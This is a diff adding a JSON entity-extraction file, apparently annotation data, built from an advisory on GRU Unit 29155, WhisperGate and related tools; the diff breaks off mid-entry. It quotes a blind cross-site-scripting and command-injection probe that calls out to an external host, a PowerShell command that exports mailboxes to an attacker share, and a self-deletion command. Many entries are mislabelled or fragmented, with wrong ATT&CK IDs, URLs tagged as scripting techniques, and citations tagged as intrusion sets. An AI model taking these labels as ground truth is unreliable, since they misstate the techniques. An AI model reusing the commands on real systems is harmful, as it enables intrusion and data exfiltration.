@@ -1,0 +1,4188 @@
+{
+ "entities": [
+  {
+   "type": "intrusion-set",
+   "name": "GRU Unit 29155",
+   "evidence": "The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and National Security Agency (NSA) assess that cyber actors affiliated with the Russian General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155) are responsible for computer network operations against global targets for the purposes of espionage, sabotage, and reputational harm since at least 2020."
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "GRU Unit 29155 cyber actors began deploying the destructive WhisperGate malware against multiple Ukrainian victim organizations as early as January 13, 2022."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data Destruction",
+   "evidence": "the destruction of data [T1485].",
+   "mitre_id": "T1485"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors have conducted computer network operations against numerous members of the North Atlantic Treaty Organization (NATO)"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "IP Range Scanning",
+   "evidence": "Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple government and critical infrastructure organizations",
+   "mitre_id": "T1595.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service and Vulnerability Discovery",
+   "evidence": "Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [T1595.002]",
+   "mitre_id": "T1595.002"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors were not observed using these tools outside of their intended purpose."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "s [T1595.001] used within multiple"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "government and critical infrastructure organizations. The following are publicly available tools these cyber"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "observed using these tools outside of their intended purpose. Note: Use of these tools should not be"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "attributed as malicious without analytical evidence to support threat actor use and/or control."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Subdomain Enumeration",
+   "evidence": " Amass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Subdomain Enumeration",
+   "evidence": "target websites [T1590.002].[7]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": " Droopescan[8]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": " JoomScan[9]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": " MASSCAN: Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "inside victim networks.[10]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": " Netcat[11]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": " Nmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "other machines [T1046]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": " Shodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": "or device types [T1596.005].[12]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": " VirusTotal[13]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": " WPScan"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": "Additionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": "[T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": "combination with Impacket and ldapdomaindump were tools used for gathering information on AD. Once"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Network Discovery",
+   "evidence": "active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Vulnerability Scanning",
+   "evidence": "Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Vulnerability Scanning",
+   "evidence": "such as blind cross-site scripting, as shown in the following commands:"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Vulnerability Scanning",
+   "evidence": "GET /index.php?log=to@example.com>%0d%0abcc:009247.3183-"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Vulnerability Scanning",
+   "evidence": "377.3183.1bf6c.19446.2@bxss.me"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Vulnerability Scanning",
+   "evidence": "\"GET /CMS/files/log.htm HTTP/1.1\" * * \"(nslookup hitccruvbrumn76c1b.bxss.me||perl"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Vulnerability Scanning",
+   "evidence": "-e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\""
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "As the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "exploit scripts for, but not exploiting, the following CVEs:"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2020-1472",
+   "evidence": " CVE-2020-1472 (Microsoft: Windows Server)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-26084",
+   "evidence": " CVE-2021-26084 (Atlassian Confluence Server and Data Center)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-3156",
+   "evidence": " CVE-2021-3156 (Red Hat: Privilege Escalation via Command Line Argument Parsing)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-4034",
+   "evidence": " CVE-2021-4034 (Red Hat: Polkit Privilege Escalation)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-27666",
+   "evidence": " CVE-2022-27666 (Red Hat: Heap Buffer Overflow Flaw)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33044",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33045",
+   "evidence": "detailed throughout this advisory:"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33044",
+   "evidence": " CVE-2021-33044 (Dahua Security)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33045",
+   "evidence": " CVE-2021-33045 (Dahua Security)"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "multiple victims at different dates and timeframes."
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol",
+   "evidence": "exfiltrated data to mega[.]nz using Rclone [T1567.002].",
+   "mitre_id": "T1567.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Pass the Hash",
+   "evidence": "used a Pass-the-Hash [T1550.002] via ProxyChains.",
+   "mitre_id": "T1550.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Bash",
+   "evidence": "embedded bash commands",
+   "mitre_id": "T1059.007"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "event should be considered independent and may have been used by Unit 29155 cyber actors against"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol",
+   "evidence": "exfiltrated data to mega[.]nz using Rclone [T1567.002]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Pass-the-Hash",
+   "evidence": "Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Windows Command Shell",
+   "evidence": "Cyber actors performed SSH and SSHPass executions."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service",
+   "evidence": "obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources i.php and tunnel.jsp."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol",
+   "evidence": "cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service",
+   "evidence": "cyber actors used Impacket for post-exploitation and lateral movement. The script secretsdump.py was used from the Impacket framework to obtain domain credentials, while psexec.py was subsequently used to move laterally within a victim network."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol",
+   "evidence": "cyber actors used ntlmrelayx.py via Impacket and krbrelayx.py, which requires Impacket to function."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service",
+   "evidence": "cyber actors used Responder.py."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Brute Force: Password Spraying",
+   "evidence": "cyber actors used su-bruteforce to brute force a selected user using the su command."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Remote Services: Remote Desktop Protocol",
+   "evidence": "cyber actors used BloodHound, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Python",
+   "evidence": "cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "System Services: Linux Privilege Escalation",
+   "evidence": "cyber actors used LinPEAS, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol",
+   "evidence": "cyber actors used GO Simple Tunnel (GOST) (MD5: 896e0f54fc67d72d94b40d7885f10c51) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "Cyber actors initiated Nmap scans on localized web servers."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service",
+   "evidence": "cyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using psexec.py from the Impacket framework. The script secretsdump.py from the Impacket framework was used to obtain domain credentials."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Access Broker",
+   "evidence": "cyber actors may have used Raspberry Robin malware in the role of an access broker [T1588.001]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Password Spraying",
+   "evidence": "cyber actors targeted victims’ Microsoft Outlook Web Access (OWA) infrastructure with password spraying to obtain valid usernames and passwords [T1110.003]."
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [T1583.003] to host"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Control",
+   "evidence": "Command and Control",
+   "mitre_id": "T1583.003"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Remote Services: Reverse TCP",
+   "evidence": "initiate communication with the threat actors’ infrastructure [T1095]. In one instance, an established",
+   "mitre_id": "T1095"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Python",
+   "evidence": "Use of the Metasploit Framework to search for and/or access modules such as mysql, postgres,",
+   "mitre_id": "T1059.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PHP",
+   "evidence": "Use of PHP (exp_door v1.0.2, b374k, WSO 4.0.5) and the P.A.S. web shells [T1505.003], likely",
+   "mitre_id": "T1505.003"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "Use of EternalBlue.[16],[17]",
+   "mitre_id": "T1211"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol",
+   "evidence": "Using Domain Name System (DNS) tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4",
+   "mitre_id": "T1071.004"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Proxy",
+   "evidence": "ProxyChains—a tool used to route internal traffic through a series of proxies [T1090.003]—has been used to provide further anonymity and modify system configuration to force",
+   "mitre_id": "T1090.003"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "GRU Unit 29155",
+   "evidence": "Named earlier in the document: GRU Unit 29155, WhisperGate, Unit 29155"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Exfiltration"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data from Information Repositories: Confluence",
+   "evidence": "T1213.001 Unit 29155 cyber actors leveraged Through the Wire against the victim’s internet-facing Confluence server.",
+   "mitre_id": "T1213.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Archive Collected Data",
+   "evidence": "Archive Collected Data T1560",
+   "mitre_id": "T1560"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Alternative Protocol",
+   "evidence": "In several instances, analysis identified Unit 29155 cyber actors compressing victim data [T1560] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure.",
+   "mitre_id": "T1560"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Alternative Protocol",
+   "evidence": "Unit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority Subsystem Service (LSASS) memory dumps [T1003.001], Security Accounts Manager (SAM) files [T1003.002], and SECURITY and SYSTEM event log files [T1654].",
+   "mitre_id": "T1003.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Alternative Protocol",
+   "evidence": "As seen in victim incident response results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate mail artifacts, such as email messages, using PowerShell [T1059.001] via the following command:",
+   "mitre_id": "T1114"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Alternative Protocol",
+   "evidence": "powershell New-MailboxExportRequest – Mailbox <resource> – FilePath `\\{IP Address}\\sharefolder\\1.pst`",
+   "mitre_id": "T1059.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Gather Victim Network Information: DNS",
+   "evidence": "Gather Victim Network Information: DNS T1590.002",
+   "mitre_id": "T1590.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning",
+   "evidence": "Active Scanning T1595",
+   "mitre_id": "T1595"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning: Vulnerability Scanning",
+   "evidence": "Active Scanning: Vulnerability Scanning T1595.002",
+   "mitre_id": "T1595.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Search Open Technical Databases: Scan Databases",
+   "evidence": "Search Open Technical Databases: Scan Databases T1596.005",
+   "mitre_id": "T1596.005"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Acquire Infrastructure: Virtual Private Server",
+   "evidence": "Acquire Infrastructure: Virtual Private Server T1583.003",
+   "mitre_id": "T1583.003"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Obtain Capabilities: Malware",
+   "evidence": "Obtain Capabilities: Malware T1588.001",
+   "mitre_id": "T1588.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Obtain Capabilities: Exploits",
+   "evidence": "Obtain Capabilities: Exploits T1588.005",
+   "mitre_id": "T1588.005"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Valid Accounts: Default Accounts",
+   "evidence": "Valid Accounts: Default Accounts T1078.001",
+   "mitre_id": "T1078.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "Exploit Public-Facing Application T1190",
+   "mitre_id": "T1190"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "Command and Scripting Interpreter: PowerShell T1059.001",
+   "mitre_id": "T1059.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Server Software Component: Web Shell",
+   "evidence": "Server Software Component: Web Shell T1505.003",
+   "mitre_id": "T1505.003"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping: LSASS Memory",
+   "evidence": "OS Credential Dumping: LSASS Memory T1003.001",
+   "mitre_id": "T1003.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping: Security Account Manager",
+   "evidence": "OS Credential Dumping: Security Account Manager T1003.002",
+   "mitre_id": "T1003.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Brute Force: Password Spraying",
+   "evidence": "Brute Force: Password Spraying T1110.003",
+   "mitre_id": "T1110.003"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Unsecured Credentials: Credentials in Files",
+   "evidence": "Unsecured Credentials: Credentials in Files T1552.001",
+   "mitre_id": "T1552.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "Network Service Discovery T1046",
+   "mitre_id": "T1046"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Log Enumeration",
+   "evidence": "Log Enumeration T1654",
+   "mitre_id": "T1654"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Use Alternate Authentication Material: Pass the Hash",
+   "evidence": "Use Alternate Authentication Material: Pass the Hash T1550.002",
+   "mitre_id": "T1550.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Email Collection",
+   "evidence": "Email Collection T1114",
+   "mitre_id": "T1114"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Video Capture",
+   "evidence": "Video Capture T1125",
+   "mitre_id": "T1125"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: Web Protocols",
+   "evidence": "Application Layer Protocol: Web Protocols T1071.001",
+   "mitre_id": "T1071.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Proxy: Multi-hop Proxy",
+   "evidence": "Proxy: Multi-hop Proxy T1090.003",
+   "mitre_id": "T1090.003"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors executed commands via ProxyChains—a tool"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Proxy: Multi-hop",
+   "evidence": "Proxy T1090.003",
+   "mitre_id": "T1090.003"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: Web Protocols",
+   "evidence": "T1071.001 Unit 29155 cyber actors use POST requests over HTTP to send payloads",
+   "mitre_id": "T1071.001"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Protocol: DNS",
+   "evidence": "T1071.004 Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2",
+   "mitre_id": "T1071.004"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Non-Application Layer Protocol",
+   "evidence": "T1095 Unit 29155 cyber actors commonly use a reverse TCP connection to",
+   "mitre_id": "T1095"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Ingress Tool Transfer",
+   "evidence": "T1105 When an exploit is successfully executed on a victim system, Unit 29155",
+   "mitre_id": "T1105"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Protocol Tunneling",
+   "evidence": "Protocol Tunneling T1572",
+   "mitre_id": "T1572"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+   "evidence": "T1567.002 Unit 29155 cyber actors exfiltrated data to the cloud storage and file",
+   "mitre_id": "T1567.002"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data Destruction",
+   "evidence": "T1485 Unit 29155 cyber actors’ objectives include the destruction of data.",
+   "mitre_id": "T1485"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "GRU Unit 29155",
+   "evidence": "20. Bellingcat: Attack on Ukrainian Government Websites Linked to GRU Hackers"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": " MITRE: WhisperGate"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors’ use of WhisperGate involved the deployment of the malware files, stage1.exe"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "Appendix A: WhisperGate Malware Analysis"
+  },
+  {
+   "type": "tool",
+   "name": "SaintBot",
+   "evidence": "saint.exe (a downloader, SaintBot, as detailed by CERT-UA)"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Scanning",
+   "evidence": "The actors used multiple Discord accounts to store malware files, including what appears to be development versions or iterations of the binaries.",
+   "mitre_id": "T1046"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Password Compromising",
+   "evidence": "The actors used multiple Discord accounts to store malware files, including what appears to be development versions or iterations of the binaries.",
+   "mitre_id": "T1555"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data Exfiltration",
+   "evidence": "The actors used multiple Discord accounts to store malware files, including what appears to be development versions or iterations of the binaries.",
+   "mitre_id": "T1041"
+  },
+  {
+   "type": "malware",
+   "name": "stage1.exe",
+   "evidence": "stage1.exe was obtained from the C:\\ path of the Ukrainian victim’s Windows machine."
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "Two Windows Portable Executable (PE) files (stage1.exe and stage2.exe) were obtained from the Ukrainian victim for analysis."
+  },
+  {
+   "type": "malware",
+   "name": "asd.exe",
+   "evidence": "asd.exe (likely a development version of stage1.exe)"
+  },
+  {
+   "type": "malware",
+   "name": "stage1.exe",
+   "evidence": "stage1.exe, stage2.exe, asd.exe, asd.exe (development version of stage1.exe)"
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "stage2.exe contained a WebClient object that was initialized with Discord URL"
+  },
+  {
+   "type": "malware",
+   "name": "Tbopbh.jpg",
+   "evidence": "An account in Discord Cluster 1 contained malware with the following hashes, labeled as Tbopbh.jpg:"
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "The original filename from the resulting payload was a Dynamic Link Library (DLL) file,"
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "Frkmlkdkdubkznbkmcf.dll; its attributes are listed in Table 21:"
+  },
+  {
+   "type": "malware",
+   "name": "Nmddfrqqrbyjeygggda.vbs",
+   "evidence": "Nmddfrqqrbyjeygggda.vbs wrote to the Windows %TEMP% directory and has the following attributes, as listed in Table 22 below."
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "stage2.exe was observed calling method Ylfwdwgmpilzyaph to begin decrypting resource 78c855a088924e92a7f60d661c3d1845."
+  },
+  {
+   "type": "malware",
+   "name": "AdvancedRun",
+   "evidence": "This decrypted DLL file contained two resources, AdvancedRun and Waqybg."
+  },
+  {
+   "type": "malware",
+   "name": "Waqybg",
+   "evidence": "This decrypted DLL file contained two resources, AdvancedRun and Waqybg."
+  },
+  {
+   "type": "file",
+   "name": "AdvancedRun.exe",
+   "evidence": "Name AdvancedRun.exe"
+  },
+  {
+   "type": "malware",
+   "name": "Waqybg",
+   "evidence": "Type Win32 EXE"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperKill",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys"
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within"
+  },
+  {
+   "type": "malware",
+   "name": "Tbopbh.jpg",
+   "evidence": "stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within"
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to"
+  },
+  {
+   "type": "malware",
+   "name": "stage1.exe",
+   "evidence": "stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "File and Directory Discovery",
+   "evidence": "ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul &",
+   "mitre_id": "T1083"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data Destruction",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys",
+   "mitre_id": "T1486"
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "ured similarly to Frkmlkdkdubkznbkmcf.dll."
+  },
+  {
+   "type": "file",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "Frkmlkdkdubkznbkmcf.dll"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "GRU Unit 29155",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "SaintBot",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "stage1.exe",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "asd.exe",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "Tbopbh.jpg",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "malware",
+   "name": "Nmddfrqqrbyjeygggda.vbs",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "tool",
+   "name": "AdvancedRun",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "tool",
+   "name": "Waqybg",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "tool",
+   "name": "WhisperKill",
+   "evidence": "Table 27: IP Addresses Associated with Unit 29155 Infrastructure"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "linked to Unit 29155 infrastructure."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data from Local Network",
+   "evidence": "data exfiltration site"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "Threat actors can exploit jump hosts, also known as jump servers or bastion hosts, to gain unauthorized access or perform malicious activities within a protected network."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Python",
+   "evidence": "https://nssm[.]cc"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Bash",
+   "evidence": "https://nssm[.]cc"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "https://nssm[.]cc"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Python",
+   "evidence": "https://3proxy[.]ru"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Bash",
+   "evidence": "https://3proxy[.]ru"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "https://3proxy[.]ru"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Python",
+   "evidence": "https://ngrok[.]com"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Bash",
+   "evidence": "https://ngrok[.]com"
+  },
+  {
+   "type": "attack-pattern",
